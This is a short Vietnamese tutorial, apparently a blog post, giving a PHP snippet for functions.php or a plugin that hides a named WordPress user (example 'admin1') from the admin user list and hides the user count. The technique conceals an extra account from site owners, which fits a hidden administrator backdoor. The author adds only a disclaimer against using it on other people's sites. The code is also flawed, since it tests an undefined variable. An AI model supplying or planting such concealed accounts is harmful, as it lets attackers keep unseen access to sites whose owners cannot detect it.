# Hướng dẫn ẩn thành viên trong trang Admin của Wordpress

- Trước tiên, tạo user muốn ẩn ( Ví dụ user mình tạo là admin1, thì điền vào code dưới là admin1 ). Sau đó copy đoạn code dưới vào bất kỳ chỗ nào trong wordpress (function.php, *plugins,...).

```c
 add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
global $current_user;
if ($username == 'admin1') {
}
else{
global $wpdb;
$user_search->query_where = str_replace('WHERE 1=1',
 "WHERE 1=1 AND {$wpdb->users}.user_login != 'admin1' ",$user_search->query_where);
}
}

function hide_useR_count(){ ?> <style> .wp-admin.users-php span.count {display:none;} </style> <?php }
add_action('admin_head','hide_user_count');
```

- Đây là dòng code ẩn user trong admin wordpress, tôi không khuyến khích bạn làm trang wordpress của người khác. Tôi sẽ không chịu trách nhiệm nào việc bạn sử dụng mục đích không chính đáng.
